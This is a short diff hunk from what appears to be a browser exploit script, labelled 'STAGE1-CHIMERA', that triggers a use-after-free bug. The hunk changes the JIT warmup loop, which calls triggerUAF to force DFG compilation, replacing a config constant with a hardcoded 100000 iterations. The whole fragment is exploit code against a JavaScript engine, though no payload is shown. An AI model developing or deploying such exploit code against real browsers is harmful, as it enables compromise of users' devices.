@@ -235,7 +235,7 @@ r.si = async function () {
   window.log("[STAGE1-CHIMERA] Phase 1: JIT warmup...");
   triggerUAF(true, 1, 1);
   triggerUAF(false, 1, 1);
-  for (let i = 0; i < CONFIG.JIT_WARMUP; ++i) {
+  for (let i = 0; i < 100000; ++i) {
     triggerUAF(false, 0, 0);
   }
   window.log("[STAGE1-CHIMERA] DFG compilation done");
